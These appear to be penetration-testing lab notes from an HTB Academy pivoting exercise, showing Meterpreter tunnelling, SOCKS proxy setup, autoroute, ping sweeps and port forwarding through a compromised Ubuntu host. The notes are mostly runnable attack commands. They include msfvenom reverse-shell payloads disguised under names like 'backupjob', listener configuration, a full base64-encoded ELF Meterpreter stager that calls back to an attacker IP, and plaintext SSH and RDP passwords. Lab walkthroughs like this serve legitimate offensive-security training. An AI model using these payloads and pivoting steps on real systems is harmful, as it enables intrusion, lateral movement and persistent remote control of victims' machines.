# Meterpreter Tunneling & Port Forwarding


## ICMP SCAN from Meterpreter

1) Creating Payload for Ubuntu Pivot Host
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080

2) Configuring & Starting the multi/handler
use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp
run

3) Executing the Payload on the Pivot Host
vi backupjob
./backupjob

4) Meterpreter Session Establishment
meterpreter > pwd
/home/ubuntu

5) Ping Sweep
-> Try to discover 172.16.5.0/23 Network
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

OR

Linux :
Ping Sweep For Loop directly on Linux Pivot Hosts
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

Windows :
Ping Sweep For Loop Using CMD
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
Powershell :
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}

## TCP SCAN from Meterpreter

1) Configuring MSF's SOCKS Proxy

use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run

2) Confirming Proxy Server is Running
jobs

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy

3) Adding a Line to proxychains.conf if Needed
socks4 	127.0.0.1 9050

4) Creating Routes with AutoRoute
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run

OR

meterpreter > run autoroute -s 172.16.5.0/23
run autoroute -p

5) Testing Proxy & Routing Functionality
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

## Port Forwarding from Meterpreter

1) Creating Local TCP Relay
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

2) Connecting to Windows Target through localhost
xfreerdp /v:localhost:3300 /u:victor /p:pass@123

Netstat Output
netstat -antp
tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp 

## Reverse Port Forwarding from Meterpreter

1) Reverse Port Forwarding Rules
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

2) Configuring & Starting multi/handler
meterpreter > bg

3) Generating the Windows Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234

4) Establishing the Meterpreter session
meterpreter > shell
C:\>

## LAB

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.204 -f elf -o backupjob LPORT=8080
use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp
run

ssh ubuntu@$TARGET
HTB_@cademy_stdnt!

cat backupjob |base64 -w 0;echo

echo -n 'f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAA+gAAAAAAAAB8AQAAAAAAAAAQAAAAAAAAMf9qCViZthBIidZNMclqIkFaagdaDwVIhcB4UWoKQVlQailYmWoCX2oBXg8FSIXAeDtIl0i5AgAfkAoKDsxRSInmahBaaipYDwVZSIXAeSVJ/8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5x2o8WGoBXw8FXmp+Wg8FSIXAeO3/5g==
' | base64 -d > backupjob

vi backupjob
./backupjob

meterpreter > pwd
/home/ubuntu

meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

[*] Performing ping sweep for IP range 172.16.5.0/23



for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
;done
64 bytes from 172.16.5.19: icmp_seq=1 ttl=128 time=0.517 ms
64 bytes from 172.16.5.129: icmp_seq=1 ttl=64 time=0.031 ms

msfconsole
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run

(Meterpreter 1)(/home/ubuntu) > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.16.5.0         255.255.254.0      Session 1
